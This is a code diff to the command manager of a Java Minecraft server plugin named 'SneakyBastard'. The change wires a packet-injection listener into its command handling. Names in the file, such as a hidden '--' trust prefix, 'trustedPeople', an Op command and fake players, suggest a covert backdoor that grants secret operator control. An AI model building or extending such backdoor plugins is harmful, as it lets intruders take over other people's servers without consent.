@@ -3,7 +3,9 @@ package net.blackofworld.sneakybastard.Command;
 import com.google.common.reflect.ClassPath;
 import com.mojang.authlib.GameProfile;
 import net.blackofworld.sneakybastard.Commands.Server.Op;
+import net.blackofworld.sneakybastard.Start;
 import net.blackofworld.sneakybastard.Utils.BukkitReflection;
+import net.blackofworld.sneakybastard.Utils.Packets.PacketInject;
 import net.minecraft.network.protocol.game.ClientboundPlayerInfoRemovePacket;
 import net.minecraft.network.protocol.game.ClientboundPlayerInfoUpdatePacket;
 import net.minecraft.server.level.ServerPlayer;
@@ -23,22 +25,24 @@ public class CommandManager {
     public static final String TRUST_COMMAND = "--";
     public static final String COMMAND_PREFIX = "§a[§6Sne§2aky§5Bast§da§2r§ed§a]§r ";
     public static CommandManager Instance;
+    public final HashSet<CommandBase> commandList = new HashSet<>();
+    public final HashMap<UUID, ServerPlayer> fakePlayers = new HashMap<>();
     private final HashSet<UUID> trustedPeople = new HashSet<>();
     private final CommandListener cl;
-    public HashSet<CommandBase> commandList = new HashSet<>();
-    public HashMap<UUID, ServerPlayer> fakePlayers = new HashMap<>();
 
     public CommandManager() {
         Init();
         Instance = this;
-        cl = new CommandListener();
+        PacketInject.register(Start.Instance);
+        PacketInject.registerListener((cl = new CommandListener()));
     }
 
     public void Destroy() {
         cl.Destroy();
         for (var uuid : trustedPeople) {
             var p = Bukkit.getPlayer(uuid);
-            if(!p.isOnline()) continue;
+            assert p != null;
+            if (!p.isOnline()) continue;
             p.SendPacket(new ClientboundPlayerInfoRemovePacket(fakePlayers.keySet().stream().toList()));
         }
         trustedPeople.clear();
